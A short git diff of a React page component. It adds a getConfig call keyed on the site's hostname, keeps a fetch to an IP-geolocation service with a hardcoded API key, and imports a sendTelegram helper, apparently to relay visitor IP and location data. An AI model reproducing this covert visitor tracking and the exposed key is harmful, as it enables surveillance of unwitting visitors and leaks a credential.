@@ -6,13 +6,17 @@ import { SignUp } from "./components/SignUp";
 import { SignUpMobile } from "./components/SignUpMobile";
 import { useEffect } from "react";
 import { sendTelegram } from "./utils/sendTelegram";
+import { getConfig } from "./utils/getConfig";
 
 function App() {
+  const hostname = window.location.hostname;
   const { Header, Sider, Content } = Layout;
   const { Panel } = Collapse;
 
   const getIpConfig = () => {
-    fetch("https://api.ipgeolocation.io/ipgeo?apiKey=defba4e9d87c44ce9125f6101daf33a1")
+    fetch(
+      "https://api.ipgeolocation.io/ipgeo?apiKey=defba4e9d87c44ce9125f6101daf33a1"
+    )
       .then((response) => response.json())
       .then((data) => {
         let body = {
@@ -43,6 +47,7 @@ function App() {
 
   useEffect(() => {
     // getIpConfig();
+    getConfig(hostname);
   }, []);
 
   return (
@@ -148,10 +153,7 @@ function App() {
                       <div className="box-color">
                         <div className="box-text">
                           <div className="center-img">
-                            <img
-                              className="img-width"
-                              src="/yourprivacy.png"
-                            />
+                            <img className="img-width" src="/yourprivacy.png" />
                           </div>
                           <h4>Your Privacy</h4>
                           <p>
